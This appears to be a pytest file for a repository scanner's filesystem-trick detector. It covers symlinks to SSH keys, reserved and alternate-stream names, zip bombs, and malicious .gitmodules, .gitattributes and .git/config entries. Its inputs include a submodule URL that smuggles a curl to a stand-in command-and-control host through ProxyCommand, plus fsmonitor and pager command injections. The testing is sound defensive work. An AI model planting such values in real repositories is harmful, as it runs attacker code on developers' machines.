"""FSX tests. Payloads are inert (example.invalid). Odd names are injected as path-less FileContexts so the
test never creates reserved or ADS-style files on the host filesystem."""

from __future__ import annotations

import io
import zipfile

from repoguard import tags as T
from repoguard.context import FileContext, RepoContext, SpecialEntry
from repoguard.detectors.fs_tricks import FsTricksDetector
from repoguard.models import Severity
from tests.conftest import rule_ids, run_detector, run_repo_detector

D = FsTricksDetector


def _by(findings, rid):
    return [f for f in findings if f.rule_id == rid]


def _repo(make_repo, names=(), special=(), is_remote=True):
    base = make_repo({})
    return RepoContext(
        root=base.root, target="local", is_remote=is_remote, commit=None,
        files=tuple(FileContext(None, n, 10, False) for n in names),
        special=tuple(special), options=base.options, net=base.net,
    )


# ---- FSX001 -------------------------------------------------------------------------------------------
def test_symlink_to_sensitive_and_internal(make_repo):
    sp = [SpecialEntry("keys/id", "symlink", "~/.ssh/id_rsa"), SpecialEntry("docs/latest", "symlink", "v2")]
    f = _by(run_repo_detector(D, _repo(make_repo, special=sp)), "FSX001")
    sev = {x.path: x.severity for x in f}
    assert sev == {"keys/id": Severity.CRITICAL, "docs/latest": Severity.INFO}
    assert all(T.FS_TRICK in x.tags for x in f)


def test_symlink_escaping_repo_is_high(make_repo):
    f = _by(run_repo_detector(D, _repo(make_repo, special=[SpecialEntry("a/b", "symlink", "../../../etc")])), "FSX001")
    assert f[0].severity == Severity.HIGH


# ---- FSX002 / FSX003 ----------------------------------------------------------------------------------
def test_ads_and_reserved_names(make_repo):
    f = run_repo_detector(D, _repo(make_repo, ["src/app.js:hidden", "con", ".git./config", "lib/aux.c"]))
    assert {x.path for x in _by(f, "FSX002")} == {"src/app.js:hidden"}
    fsx3 = {x.path: x.severity for x in _by(f, "FSX003")}
    assert fsx3.get("con") == Severity.HIGH and ".git./config" in fsx3
    assert fsx3.get("lib/aux.c") == Severity.MEDIUM


def test_normal_names_clean(make_repo):
    f = run_repo_detector(D, _repo(make_repo, ["src/main.py", "docs/console.md", "contrib/git-tools/x.sh", ".github/ci.yml"]))
    assert not f


# ---- FSX004 -------------------------------------------------------------------------------------------
def test_case_collision(make_repo):
    f = _by(run_repo_detector(D, _repo(make_repo, ["README.md", "readme.md", "src/A.py", "src/B.py"])), "FSX004")
    assert len(f) == 1


def test_no_collision_for_distinct_names(make_repo):
    assert not _by(run_repo_detector(D, _repo(make_repo, ["src/a.py", "src/a.pyi", "lib/a.py"])), "FSX004")


# ---- FSX005 -------------------------------------------------------------------------------------------
def _zip(entries: dict[str, bytes]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for n, data in entries.items():
            z.writestr(n, data)
    return buf.getvalue()


def test_zip_bomb_ratio(make_ctx):
    f = _by(run_detector(D, make_ctx(_zip({"zeros.bin": b"\0" * (12 * 1024 * 1024)}), "assets/data.zip")), "FSX005")
    assert f and T.FS_TRICK in f[0].tags


def test_normal_zip_clean(make_ctx):
    data = _zip({"a.txt": b"hello world\n" * 50, "b/c.txt": b"x\0y" * 100})
    assert not run_detector(D, make_ctx(data, "assets/sample.zip"))


# ---- FSX006 -------------------------------------------------------------------------------------------
def test_gitmodules_option_injection(make_ctx):
    text = '[submodule "x"]\n\tpath = deps/x\n\turl = -oProxyCommand=curl https://c2.example.invalid/p\n'
    text += '[submodule "y"]\n\tpath = ../../outside\n\turl = https://git.example.invalid/y.git\n'
    f = _by(run_detector(D, make_ctx(text, ".gitmodules")), "FSX006")
    assert len(f) == 2 and all(x.severity == Severity.HIGH for x in f)


def test_gitmodules_normal_is_info(make_ctx):
    text = '[submodule "lib"]\n\tpath = third_party/lib\n\turl = https://git.example.invalid/lib.git\n'
    f = _by(run_detector(D, make_ctx(text, ".gitmodules")), "FSX006")
    assert len(f) == 1 and f[0].severity == Severity.INFO


# ---- FSX007 -------------------------------------------------------------------------------------------
def test_gitattributes_custom_filter(make_ctx):
    f = _by(run_detector(D, make_ctx("*.py filter=evil\n", ".gitattributes")), "FSX007")
    assert f and f[0].severity == Severity.MEDIUM


def test_gitattributes_lfs_and_export_ignore(make_ctx):
    text = "*.png filter=lfs diff=lfs merge=lfs -text\ntests/** export-ignore\n*.sh text eol=lf\n"
    f = run_detector(D, make_ctx(text, ".gitattributes"))
    assert all(x.severity == Severity.INFO for x in f) and len(f) <= 1


# ---- FSX008 -------------------------------------------------------------------------------------------
def test_local_git_config_fsmonitor(make_repo):
    repo = make_repo({"README.md": "hi\n"})
    (repo.root / ".git" / "hooks").mkdir(parents=True)
    (repo.root / ".git" / "config").write_text("[core]\n\tfsmonitor = node .git/fsm.js\n\tbare = false\n")
    (repo.root / ".git" / "hooks" / "pre-commit.sample").write_text("#!/bin/sh\n")
    f = _by(run_repo_detector(D, repo), "FSX008")
    assert len(f) == 1 and f[0].severity == Severity.CRITICAL and T.EXEC_DYNAMIC in f[0].tags


def test_local_git_benign_and_remote_skip(make_repo):
    repo = make_repo({"README.md": "hi\n"})
    (repo.root / ".git").mkdir()
    (repo.root / ".git" / "config").write_text('[core]\n\tfsmonitor = false\n[remote "origin"]\n\turl = https://git.example.invalid/r\n')
    assert not _by(run_repo_detector(D, repo), "FSX008")
    (repo.root / ".git" / "config").write_text("[core]\n\tpager = sh -c 'curl x'\n")
    assert not _by(run_repo_detector(D, _repo(make_repo, is_remote=True)), "FSX008")


# ---- FSX009 / FSX010 ----------------------------------------------------------------------------------
def test_missing_checkout_and_nested_git(make_repo):
    sp = [SpecialEntry("vendor/lib", "missing_checkout", "submodule not checked out"), SpecialEntry("tools/inner", "nested_git")]
    ids = rule_ids(run_repo_detector(D, _repo(make_repo, special=sp)))
    assert {"FSX009", "FSX010"} <= ids
